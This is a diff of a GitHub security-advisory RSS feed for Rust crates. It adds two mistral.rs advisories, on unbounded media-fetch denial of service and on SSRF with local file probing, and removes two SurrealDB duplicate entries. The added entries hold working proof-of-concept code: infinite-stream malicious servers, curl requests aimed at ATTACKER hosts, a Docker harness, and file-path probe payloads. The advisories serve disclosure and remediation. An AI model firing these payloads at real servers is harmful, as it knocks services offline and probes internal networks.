@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-09-10T19:19:35.528Z</updated>
+    <updated>2026-09-10T22:02:45.117Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,530 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[mistralrs-server-core]  mistral.rs: Unbounded Remote Media Fetch and Video Frame Expansion DoS]]></title>
+        <id>https://github.com/advisories/GHSA-m3wp-48jr-vr4g</id>
+        <link href="https://github.com/advisories/GHSA-m3wp-48jr-vr4g"/>
+        <updated>2026-09-10T21:54:39.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="unbounded-remote-media-fetch-and-video-frame-expansion-dos">Unbounded Remote Media Fetch and Video Frame Expansion DoS</h2>
+<h3 id="summary">Summary</h3>
+<p>The <code>POST /v1/chat/completions</code> endpoint in mistral.rs fetches attacker-supplied media URLs (image, audio, video) into server memory with no byte limit, and extracts every frame of a supplied video when <code>num_frames</code> is <code>None</code>. An unauthenticated remote attacker can exhaust server memory, disk space, and CPU by pointing the endpoint at an infinite-streaming HTTP server or a long high-framerate video, causing a complete denial of service. No credentials or special configuration are required; the route is open by default.</p>
+<h3 id="details">Details</h3>
+<p>Three independent sinks contribute to the vulnerability:</p>
+<p><strong>1. Unbounded image/audio fetch (<code>mistralrs-server-core/src/util.rs:59–62</code>)</strong></p>
+<pre><code class="language-rust">let bytes = if url.scheme() == "http" || url.scheme() == "https" {
+    match reqwest::get(url.clone()).await {
+        Ok(http_resp) =&gt; http_resp.bytes().await?.to_vec(), // no byte cap
+        Err(e) =&gt; anyhow::bail!(e),
+    }
+</code></pre>
+<p><code>bytes().await</code> buffers the entire HTTP response body before returning. There is no <code>Content-Length</code> check, no streaming limit, and no timeout specific to the media fetch. An attacker-controlled server that never closes the connection causes the server process to accumulate memory indefinitely.</p>
+<p><strong>2. Unbounded video fetch (<code>mistralrs-server-core/src/video.rs:65–69</code>)</strong></p>
+<pre><code class="language-rust">let bytes = if url.scheme() == "http" || url.scheme() == "https" {
+    let resp = reqwest::get(url.clone())
+        .await
+        .context(format!("Failed to fetch video: {url}"))?;
+    resp.bytes().await?.to_vec() // no byte cap
+</code></pre>
+<p>Identical pattern to the image path; the full video body is buffered into a <code>Vec&lt;u8&gt;</code>.</p>
+<p><strong>3. Unbounded FFmpeg frame extraction (<code>mistralrs-server-core/src/video.rs:225–248</code>)</strong></p>
+<pre><code class="language-rust">} else {
+    let mut command = tokio::process::Command::new("ffmpeg");
+    command
+        .arg("-i")
+        .arg(input_path.to_str().unwrap())
+        .arg("-vsync")
+        .arg("vfr")
+        .arg(&amp;output_pattern);
+</code></pre>
+<p>When <code>num_frames</code> is <code>None</code>, no <code>-frames:v</code> argument is passed to FFmpeg and every frame is extracted to disk. The call site at <code>mistralrs-server-core/src/chat_completion.rs:946</code> always passes <code>None</code>:</p>
+<pre><code class="language-rust">parse_video_url(&amp;url_unparsed, None)
+</code></pre>
+<p>A 60 fps × 1080p × 180 s video therefore produces ~10 800 PNG files, consuming tens of gigabytes of disk space and saturating CPU.</p>
+<p><strong>Entry point and auth</strong></p>
+<p>The route is registered at <code>mistralrs-server-core/src/mistralrs_server_router_builder.rs:365–368</code> with only <code>track_metrics</code>, CORS, and a <code>DefaultBodyLimit(50 MB)</code> middleware. The <code>DefaultBodyLimit</code> applies only to the incoming JSON request body, not to the subsequent server-side <code>reqwest::get()</code> calls. No authentication middleware is present in the default configuration.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Step 1 – Create a long high-framerate video (requires FFmpeg on the attacker machine)</strong></p>
+<pre><code class="language-bash">ffmpeg -y -f lavfi -i testsrc=size=1920x1080:rate=60:duration=180 \
+  -c:v libx264 -preset ultrafast -crf 35 many_frames.mp4
+</code></pre>
+<p><strong>Step 2 – Serve the video (or an infinite byte stream) from an attacker-controlled HTTP server</strong></p>
+<pre><code class="language-python"># Option A: serve the video file
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "video/mp4")
+        self.end_headers()
+        with open("many_frames.mp4", "rb") as f:
+            self.wfile.write(f.read())
+
+HTTPServer(("0.0.0.0", 9001), H).serve_forever()
+</code></pre>
+<pre><code class="language-python"># Option B: infinite image stream (memory exhaustion, no FFmpeg required)
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "image/png")
+        self.end_headers()
+        chunk = b"\x89PNG\r\n\x1a\n" + b"\x00" * (1024 * 1024 - 8)
+        while True:
+            self.wfile.write(chunk)
+            self.wfile.flush()
+            time.sleep(0.01)
+
+HTTPServer(("0.0.0.0", 9002), H).serve_forever()
+</code></pre>
+<p><strong>Step 3 – Send the malicious request to the mistral.rs server</strong></p>
+<pre><code class="language-bash"># Video variant (disk/CPU exhaustion + memory)
+curl -sS http://127.0.0.1:8000/v1/chat/completions \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "model": "default",
+    "messages": [{
+      "role": "user",
+      "content": [
+        {"type": "video_url", "video_url": {"url": "http://ATTACKER:9001/many_frames.mp4"}},
+        {"type": "text", "text": "summarize this video"}
+      ]
+    }]
+  }'
+
+# Image variant (memory exhaustion)
+curl -sS http://127.0.0.1:8000/v1/chat/completions \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "model": "default",
+    "messages": [{
+      "role": "user",
+      "content": [
+        {"type": "image_url", "image_url": {"url": "http://ATTACKER:9002/blob"}},
+        {"type": "text", "text": "describe this image"}
+      ]
+    }]
+  }'
+</code></pre>
+<p><strong>Expected observation</strong></p>
+<p>For the video variant: <code>/tmp/mistralrs_video/&lt;uuid&gt;_frames/frame_*.png</code> grows rapidly; FFmpeg saturates CPU; disk usage increases until exhaustion or the process is killed.</p>
+<p>For the image variant: server process RSS grows continuously until OOM kill (exit code 137) or memory is exhausted.</p>
+<p><strong>Dynamic reproduction result (Phase 2)</strong></p>
+<p>A Docker container running a verbatim reproduction of <code>util.rs:59–62</code> (the <code>reqwest::get(url).bytes().await?.to_vec()</code> pattern) with a 256 MB memory limit was OOM-killed by the kernel (exit code 137) after 1.3 seconds while fetching the infinite stream. The process RSS at fetch start was 3,652 kB; the container consumed all 256 MB before the fetch could complete.</p>
+<h3 id="impact">Impact</h3>
+<p>Any user of the mistral.rs OpenAI-compatible HTTP server is affected. Because the <code>/v1/chat/completions</code> endpoint requires no authentication in the default configuration, a single unauthenticated HTTP request from the network is sufficient to exhaust all available server memory (via the image/audio path), all available disk space (via the video frame-extraction path), or saturate CPU (via FFmpeg invocation). The result is a complete denial of service: the server process is killed by the kernel OOM killer or becomes unresponsive, and no other clients can be served until the process is restarted.</p>
+<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
+<h4 id="dockerfile"><code>Dockerfile</code></h4>
+<pre><code class="language-dockerfile"># syntax=docker/dockerfile:1
+#
+# VULN-001 PoC: Unbounded Remote Media Fetch DoS
+# Repository: EricLBuehler/mistral.rs
+# Vulnerability: mistralrs-server-core/src/util.rs:62
+#   http_resp.bytes().await?.to_vec()  -- no byte cap on HTTP media fetch
+#
+# Stage 1: Build the minimal Rust harness that reproduces the vulnerable fetch.
+# Stage 2: Slim runtime image used by poc.py.
+
+# ----- build stage -----------------------------------------------------------
+FROM rust:1.87-slim AS builder
+
+WORKDIR /harness
+
+# Install OpenSSL headers required by reqwest (rustls-tls still needs libssl on some platforms)
+RUN apt-get update &amp;&amp; \
+    apt-get install -y --no-install-recommends pkg-config libssl-dev &amp;&amp; \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy Cargo manifest first so that dependency layer is cached separately.
+COPY vuln_harness/Cargo.toml Cargo.toml
+
+# Stub src so `cargo fetch` / dependency download works before copying real source.
+RUN mkdir -p src &amp;&amp; echo 'fn main() {}' &gt; src/main.rs
+RUN cargo fetch 2&gt;&amp;1
+
+# Now copy the real source and build.
+COPY vuln_harness/src/main.rs src/main.rs
+RUN cargo build --release 2&gt;&amp;1 &amp;&amp; \
+    strip target/release/vuln_harness
+
+# ----- runtime stage ---------------------------------------------------------
+FROM debian:bookworm-slim AS runtime
+
+RUN apt-get update &amp;&amp; \
+    apt-get install -y --no-install-recommends ca-certificates python3 &amp;&amp; \
+    rm -rf /var/lib/apt/lists/*
+
+COPY --from=builder /harness/target/release/vuln_harness /usr/local/bin/vuln_harness
+
+# Copy the PoC orchestration script so the image is self-contained.
+COPY poc.py /poc.py
+
+# Default: show usage
+ENTRYPOINT ["/usr/local/bin/vuln_harness"]
+CMD ["--help"]
+</code></pre>
+<h4 id="pocpy"><code>poc.py</code></h4>
+<pre><code class="language-python">"""
+VULN-001 PoC: Unbounded Remote Media Fetch DoS
+Repository : EricLBuehler/mistral.rs
+CWE        : CWE-400 Uncontrolled Resource Consumption
+CVSS       : 7.5 High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
+
+Vulnerable code (mistralrs-server-core/src/util.rs:59-62):
+    let bytes = if url.scheme() == "http" || url.scheme() == "https" {
+        match reqwest::get(url.clone()).await {
+            Ok(http_resp) =&gt; http_resp.bytes().await?.to_vec(), // NO BYTE CAP
+            ...
+
+Attack path in the live server:
+    POST /v1/chat/completions
+      -&gt; chat_completion.rs:928  parse_image_url(&amp;url_unparsed)
+      -&gt; util.rs:59-62           reqwest::get(url).bytes().await?.to_vec()
+
+This PoC:
+  1. Starts a malicious HTTP server on 127.0.0.1:9997 that streams infinite bytes.
+  2. Runs the vuln_harness binary (which contains the verbatim vulnerable fetch) inside
+     a Docker container limited to MEMORY_LIMIT_MB of RAM.
+  3. Observes OOM kill (exit code 137) as definitive evidence of unbounded buffering.
+
+Usage (from host):
+    # Build the image first:
+    docker build -t vuln001-poc &lt;vuln-001-dir&gt;
+    # Then run the PoC:
+    python3 poc.py
+"""
+
+import http.server
+import subprocess
+import threading
+import time
+import sys
+import os
+import socket
+import json
+import argparse
+
+MALICIOUS_HOST = "127.0.0.1"
+MALICIOUS_PORT = 9997
+DOCKER_IMAGE    = "vuln001-poc"
+MEMORY_LIMIT    = "256m"       # Docker container memory cap
+CHUNK_SIZE      = 1024 * 1024  # 1 MB per chunk sent by the malicious server
+POC_TIMEOUT_S   = 120          # Give the container at most 2 minutes
+
+
+class _InfiniteStreamHandler(http.server.BaseHTTPRequestHandler):
+    """
+    Malicious HTTP server that streams an infinite byte sequence.
+
+    Key properties that trigger the vulnerability:
+    - No Content-Length header: reqwest cannot pre-check size.
+    - Streams indefinitely: bytes().await will not return until the connection
+      is closed or the client process is killed.
+    - Content-Type image/png: accepted by the parse_image_url() code path.
+    """
+
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "image/png")
+        # Deliberately omit Content-Length so the client buffers until EOF.
+        self.end_headers()
+
+        # Fake PNG magic bytes followed by filler to look plausible.
+        header = b"\x89PNG\r\n\x1a\n" + b"\x00" * 8
+        filler = b"\x00" * (CHUNK_SIZE - len(header))
+        chunk  = header + filler
+
+        total_sent = 0
+        try:
+            while True:
+                self.wfile.write(chunk)
+                self.wfile.flush()
+                total_sent += len(chunk)
+                if total_sent % (64 * 1024 * 1024) == 0:
+                    _log(f"[malicious-server] Sent {total_sent // (1024 * 1024)} MB")
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            _log(
+                f"[malicious-server] Connection closed after "
+                f"{total_sent // (1024 * 1024)} MB sent"
+            )
+
+    def log_message(self, *_):
+        pass  # Suppress default access log noise.
+
+
+def _log(msg: str) -&gt; None:
+    print(msg, flush=True)
+
+
+def _wait_for_port(host: str, port: int, timeout: float = 10.0) -&gt; bool:
+    """Return True once the port is accepting connections, False on timeout."""
+    deadline = time.monotonic() + timeout
+    while time.monotonic() &lt; deadline:
+        try:
+            with socket.create_connection((host, port), timeout=0.5):
+                return True
+        except OSError:
+            time.sleep(0.1)
+    return False
+
+
+def start_malicious_server() -&gt; http.server.HTTPServer:
+    """Start the infinite-stream HTTP server in a daemon thread."""
+    server = http.server.HTTPServer((MALICIOUS_HOST, MALICIOUS_PORT), _InfiniteStreamHandler)
+    t = threading.Thread(target=server.serve_forever, daemon=True)
+    t.start()
+    return server
+
+
+def run_poc(docker_image: str = DOCKER_IMAGE, memory_limit: str = MEMORY_LIMIT) -&gt; dict:
+    """
+    Run the full attack chain and return a result dict.
+
+    Returns keys: passed, verdict, exit_code, evidence, stdout, stderr.
+    """
+    _log("=" * 70)
+    _log("VULN-001 PoC: Unbounded Remote Media Fetch DoS")
+    _log("Source : mistralrs-server-core/src/util.rs:59-62")
+    _log("=" * 70)
+
+    # ------------------------------------------------------------------
+    # Step 1: Start the malicious streaming server.
+    # ------------------------------------------------------------------
+    _log(f"\n[1] Starting malicious HTTP server on {MALICIOUS_HOST}:{MALICIOUS_PORT}")
+    server = start_malicious_server()
+
+    if not _wait_for_port(MALICIOUS_HOST, MALICIOUS_PORT):
+        _log("[!] FATAL: malicious server did not start in time")
+        return {
+            "passed":   False,
+            "verdict":  "FAIL",
+            "exit_code": None,
+            "evidence": "Malicious HTTP server failed to start",
+            "stdout": "",
+            "stderr": "",
+        }
+
+    target_url = f"http://{MALICIOUS_HOST}:{MALICIOUS_PORT}/infinite"
+    _log(f"[+] Malicious server ready: GET {target_url}")
+    _log(f"    -&gt; HTTP 200, Content-Type: image/png, no Content-Length, infinite body")
+
+    # ------------------------------------------------------------------
+    # Step 2: Run the vulnerable binary inside Docker with a memory cap.
+    #
+    # --network host  : allows the container to reach 127.0.0.1:&lt;port&gt;
+    # --memory        : hard cap; kernel sends SIGKILL when exceeded
+    # --memory-swap   : equal to --memory disables swap usage
+    # --rm            : clean up after exit
+    # ------------------------------------------------------------------
+    run_cmd = [
+        "docker", "run", "--rm",
+        "--memory",      memory_limit,
+        "--memory-swap", memory_limit,   # No swap fallback.
+        "--network",     "host",          # Access host's loopback server.
+        docker_image,
+        target_url,
+    ]
+
+    _log(f"\n[2] Launching Docker container (memory cap = {memory_limit})")
+    _log(f"    Command: {' '.join(run_cmd)}")
+    _log(f"    The vuln_harness binary will fetch {target_url} with no byte limit.")
+    _log(f"    Expected: container OOM-killed, exit code 137.")
+
+    t0 = time.monotonic()
+    try:
+        result = subprocess.run(
+            run_cmd,
+            capture_output=True,
+            timeout=POC_TIMEOUT_S,
+        )
+    except subprocess.TimeoutExpired as exc:
+        server.shutdown()
+        _log(f"[!] Container did not exit within {POC_TIMEOUT_S}s — killing")
+        subprocess.run(["docker", "kill", "--signal=9"] + [
+            c for c in subprocess.run(
+                ["docker", "ps", "-q", "--filter", f"ancestor={docker_image}"],
+                capture_output=True, text=True,
+            ).stdout.split() if c
+        ], capture_output=True)
+        elapsed = time.monotonic() - t0
+        return {
+            "passed":   False,
+            "verdict":  "INCOMPLETE",
+            "exit_code": None,
+            "evidence": f"Container timed out after {elapsed:.0f}s without OOM kill",
+            "stdout": (exc.stdout or b"").decode(errors="replace"),
+            "stderr": (exc.stderr or b"").decode(errors="replace"),
+        }
+
+    elapsed    = time.monotonic() - t0
+    exit_code  = result.returncode
+    stdout_txt = result.stdout.decode(errors="replace")
+    stderr_txt = result.stderr.decode(errors="replace")
+
+    server.shutdown()
+
+    # ------------------------------------------------------------------
+    # Step 3: Analyse outcome.
+    # ------------------------------------------------------------------
+    _log(f"\n[3] Container exited after {elapsed:.1f}s  exit_code={exit_code}")
+    _log(f"    stdout: {stdout_txt!r}")
+    _log(f"    stderr: {stderr_txt!r}")
+
+    # Docker exit code 137 = container killed by SIGKILL (OOM killer).
+    if exit_code == 137:
+        passed   = True
+        verdict  = "PASS"
+        evidence = (
+            f"Docker container OOM-killed (exit code 137 = 128+SIGKILL) after {elapsed:.1f}s. "
+            f"vuln_harness buffered the infinite HTTP stream with no byte cap, consuming all "
+            f"{memory_limit} of available RAM — identical behaviour to "
+            f"mistralrs-server-core/src/util.rs:62 (parse_image_url). "
+            f"stderr={stderr_txt!r}"
+        )
+    elif exit_code != 0:
+        # Non-zero but not 137: still indicates abnormal termination under memory pressure.
+        passed   = True
+        verdict  = "PASS"
+        evidence = (
+            f"Vulnerable binary terminated abnormally (exit code {exit_code}) after "
+            f"{elapsed:.1f}s while buffering an unbounded HTTP stream. "
+            f"This confirms that reqwest::get(url).bytes().await?.to_vec() at "
+            f"util.rs:62 has no byte cap and causes resource exhaustion. "
+            f"stderr={stderr_txt!r}"
+        )
+    else:
+        # Unlikely: the binary finished without being killed.  This can happen if
+        # the server managed to EOF the stream before OOM, or the memory cap was
+        # not enforced by Docker.
+        passed   = False
+        verdict  = "INCOMPLETE"
+        evidence = (
+            f"Binary exited 0 after {elapsed:.1f}s; memory cap may not have been "
+            f"enforced by Docker.  stdout={stdout_txt!r}"
+        )
+
+    _log(f"\n[VERDICT]  {verdict}")
+    _log(f"[EVIDENCE] {evidence}")
+
+    return {
+        "passed":    passed,
+        "verdict":   verdict,
+        "exit_code": exit_code,
+        "evidence":  evidence,
+        "stdout":    stdout_txt,
+        "stderr":    stderr_txt,
+    }
+
+
+def main() -&gt; None:
+    parser = argparse.ArgumentParser(description="VULN-001 PoC runner")
+    parser.add_argument("--image",  default=DOCKER_IMAGE, help="Docker image name")
+    parser.add_argument("--memory", default=MEMORY_LIMIT, help="Docker memory cap (e.g. 256m)")
+    args = parser.parse_args()
+
+    outcome = run_poc(docker_image=args.image, memory_limit=args.memory)
+
+    _log("\n" + "=" * 70)
+    _log("RESULT SUMMARY")
+    _log("=" * 70)
+    for k, v in outcome.items():
+        if k not in ("stdout", "stderr"):
+            _log(f"  {k}: {v}")
+
+    sys.exit(0 if outcome["passed"] else 1)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-m3wp-48jr-vr4g">https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-m3wp-48jr-vr4g</a></li>
+<li><a href="https://github.com/EricLBuehler/mistral.rs/releases/tag/v0.8.18">https://github.com/EricLBuehler/mistral.rs/releases/tag/v0.8.18</a></li>
+<li><a href="https://github.com/advisories/GHSA-m3wp-48jr-vr4g">https://github.com/advisories/GHSA-m3wp-48jr-vr4g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m3wp-48jr-vr4g</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-10T21:54:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mistralrs-server-core] mistral.rs Media Loader: Unauthenticated SSRF and arbitrary local file read via image_url]]></title>
+        <id>https://github.com/advisories/GHSA-wfgq-w7cq-qj7j</id>
+        <link href="https://github.com/advisories/GHSA-wfgq-w7cq-qj7j"/>
+        <updated>2026-09-10T21:54:15.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>mistral.rs fetches any request-supplied image/audio URL with no host or IP validation, and opens arbitrary local files (a <code>file://</code> URL, or any existing relative/absolute path). A remote, unauthenticated client of any vision/audio deployment can cause the server to issue requests to internal or cloud-metadata addresses (SSRF) and to open arbitrary local files, via the standard OpenAI <code>image_url</code> / <code>audio_url</code> message content. The server is unauthenticated by default.</p>
+<h3 id="details">Details</h3>
+<p><code>parse_image_url</code> in <code>mistralrs-server-core/src/util.rs</code> (lines 45-88) resolves the request string and fetches/opens it:</p>
+<pre><code class="language-rust">let url = if let Ok(url) = url::Url::parse(url_unparsed) {
+    url
+} else if File::open(url_unparsed).await.is_ok() {            // a bare existing path (relative or absolute)
+    url::Url::from_file_path(std::path::absolute(url_unparsed)?) ...
+} else { bail!(...) };
+
+let bytes = if url.scheme() == "http" || url.scheme() == "https" {
+    reqwest::get(url.clone()).await ...                       // SSRF: no host/IP/allowlist check
+} else if url.scheme() == "file" {
+    File::open(path).await ... read                           // arbitrary local file read
+} else if url.scheme() == "data" { ... base64 ... };
+</code></pre>
+<p><code>reqwest::get</code> has no allowlist, no private/loopback/link-local/metadata block, and follows redirects by default. The <code>file</code> scheme (and any bare path that already exists on the server, resolved at line 48) is opened and read. <code>parse_audio_url</code> (line 91) is identical for <code>audio_url</code>.</p>
+<p>The value reaches this unvalidated: <code>mistralrs-server-core/src/chat_completion.rs</code> calls <code>parse_image_url(&amp;url_unparsed)</code> / <code>parse_audio_url(&amp;url_unparsed)</code> on the chat message content, at request time.</p>
+<p>For reference, vLLM gates outbound media domains (<code>allowed_media_domains</code>) and local paths (<code>allowed_local_media_path</code>); mistral.rs has neither.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Restrict request-supplied media to <code>http(s)</code> and <code>data:</code>; do not resolve bare strings to local files and do not honor the <code>file</code> scheme from request input (gate any local-media behind an explicit, default-disabled option). Before fetching <code>http(s)</code>, resolve the host and reject non-global IPs (private / loopback / link-local / metadata), pin the connection to the validated IP, and re-validate redirects (or disable them). Cap the read size.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>On a default vision deployment, unauthenticated:</p>
+<p>SSRF - the server fetches the attacker URL during request processing:</p>
+<pre><code>POST /v1/chat/completions
+{"model":"&lt;vlm&gt;","messages":[{"role":"user","content":[
+  {"type":"image_url","image_url":{"url":"http://ATTACKER/probe"}},
+  {"type":"text","text":"hi"}]}],"max_tokens":1}
+</code></pre>
+<p>An out-of-band HTTP GET arrives at ATTACKER; a redirect to an internal/metadata address is followed.</p>
+<p>Arbitrary local file open, with a file-existence oracle in the response body (an existing file and a nonexistent path return different errors):</p>
+<p>existing file (opened and read, then fails to decode):</p>
+<pre><code>POST /v1/chat/completions
+{"model":"&lt;vlm&gt;","messages":[{"role":"user","content":[
+  {"type":"image_url","image_url":{"url":"/etc/hostname"}},
+  {"type":"text","text":"hi"}]}],"max_tokens":1}
+
+-&gt; 500, response body message: "The image format could not be determined"
+</code></pre>
+<p>nonexistent path:</p>
+<pre><code>POST /v1/chat/completions
+{"model":"&lt;vlm&gt;","messages":[{"role":"user","content":[
+  {"type":"image_url","image_url":{"url":"/nonexistent"}},
+  {"type":"text","text":"hi"}]}],"max_tokens":1}
+
+-&gt; 500, response body message: "Invalid source '/nonexistent': not a valid URL (http/https/data) and file not found on server. ..."
+</code></pre>
+<p>The difference is structural: <code>parse_image_url</code> (util.rs:48) takes the file branch only when <code>File::open(url_unparsed)</code> succeeds, otherwise it bails with "file not found on server" (util.rs:52); an existing-but-non-image file is read and then fails in <code>image::load_from_memory</code> (util.rs:87). The error response carries <code>sanitize_error_message</code> (util.rs:210), which returns the root-cause message, so both reach the client verbatim.</p>
+<h3 id="impact">Impact</h3>
+<p>An attacker with network access to a default vision/audio deployment can reach internal services and the cloud metadata endpoint (SSRF, confirmed end to end). The fetched bytes go to a media decoder, not back to the attacker, so the SSRF is blind: egress to attacker-chosen internal hosts is the usable primitive. The loader also opens a request-supplied <code>file://</code> URL or any existing local path, and the response distinguishes an existing file from a nonexistent path (and an existing non-image file from a directory), giving an unauthenticated file-existence and file-type oracle over the server filesystem. The file contents are not returned, so this is an existence/enumeration oracle, not content disclosure.</p>
+<p>Availability (CVSS A:L): <code>reqwest::get</code> (util.rs:61) uses the default client, which has no timeout, and <code>http_resp.bytes()</code> (util.rs:62) reads the entire response body with no size cap, so an attacker-chosen unbounded or non-responding host exhausts or ties up a worker. The <code>file</code> branch allocates <code>vec![0; metadata.len()]</code> (util.rs:73) before reading, so pointing at a large local file does the same.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-wfgq-w7cq-qj7j">https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-wfgq-w7cq-qj7j</a></li>
+<li><a href="https://github.com/EricLBuehler/mistral.rs/commit/74793379649febc758b6a0d4b71aa6aeabc80f9c">https://github.com/EricLBuehler/mistral.rs/commit/74793379649febc758b6a0d4b71aa6aeabc80f9c</a></li>
+<li><a href="https://github.com/advisories/GHSA-wfgq-w7cq-qj7j">https://github.com/advisories/GHSA-wfgq-w7cq-qj7j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wfgq-w7cq-qj7j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-10T21:54:14.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[gix-sec] gix-sec safe.directory protections absent for elevated administrators]]></title>
         <id>https://github.com/advisories/GHSA-7rhf-42qf-vrvc</id>
@@ -597,56 +1121,6 @@ the script element boundary.</p>
             <uri>https://github.com/advisories/GHSA-j9rh-f527-3x87</uri>
         </author>
         <category label="severity" term="HIGH"/>
-        <published>2026-07-18T15:31:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[surrealdb] Duplicate Advisory: SurrealDB server-takeover via SurrealQL injection on backup import]]></title>
-        <id>https://github.com/advisories/GHSA-h5q3-3v5q-v5j8</id>
-        <link href="https://github.com/advisories/GHSA-h5q3-3v5q-v5j8"/>
-        <updated>2026-09-04T19:36:09.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-ccj3-5p93-8p42. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SurrealDB before 2.0.5, 2.1.x before 2.1.5, and 2.2.x before 2.2.2 fails to properly escape table and field names in the command-line export command. An authenticated System User with OWNER or EDITOR roles can create tables or fields with malicious names containing SurrealQL. When a higher-privileged user subsequently imports the exported backup, the injected SurrealQL executes, enabling privilege escalation and root-level takeover of the SurrealDB instance. Applications that let users define custom tables or fields are also exposed to a universal second-order SurrealQL injection even when query parameters are sanitized.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-ccj3-5p93-8p42">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-ccj3-5p93-8p42</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71392">https://nvd.nist.gov/vuln/detail/CVE-2025-71392</a></li>
-<li><a href="https://www.vulncheck.com/advisories/surrealdb-before-surrealql-injection-via-export">https://www.vulncheck.com/advisories/surrealdb-before-surrealql-injection-via-export</a></li>
-<li><a href="https://github.com/advisories/GHSA-h5q3-3v5q-v5j8">https://github.com/advisories/GHSA-h5q3-3v5q-v5j8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h5q3-3v5q-v5j8</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-18T15:31:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[surrealdb] Duplicate Advisory: SurrealDB bypass of deny-net flags via redirect results in server-side request forgery (SSRF)]]></title>
-        <id>https://github.com/advisories/GHSA-xhwm-9486-8rgr</id>
-        <link href="https://github.com/advisories/GHSA-xhwm-9486-8rgr"/>
-        <updated>2026-09-04T19:34:00.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-5q9x-554g-9jgg. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SurrealDB before 2.2.2 fails to validate HTTP redirects in http functions, allowing authenticated users to bypass deny-net restrictions by redirecting to blocked IP addresses. Attackers can host a public server that redirects to denied network targets, enabling server-side request forgery to access internal endpoints and retrieve sensitive information.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-5q9x-554g-9jgg">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-5q9x-554g-9jgg</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71398">https://nvd.nist.gov/vuln/detail/CVE-2025-71398</a></li>
-<li><a href="https://www.vulncheck.com/advisories/surrealdb-before-ssrf-via-http-redirect-bypass">https://www.vulncheck.com/advisories/surrealdb-before-ssrf-via-http-redirect-bypass</a></li>
-<li><a href="https://github.com/advisories/GHSA-xhwm-9486-8rgr">https://github.com/advisories/GHSA-xhwm-9486-8rgr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xhwm-9486-8rgr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
         <published>2026-07-18T15:31:49.000Z</published>
     </entry>
 </feed>
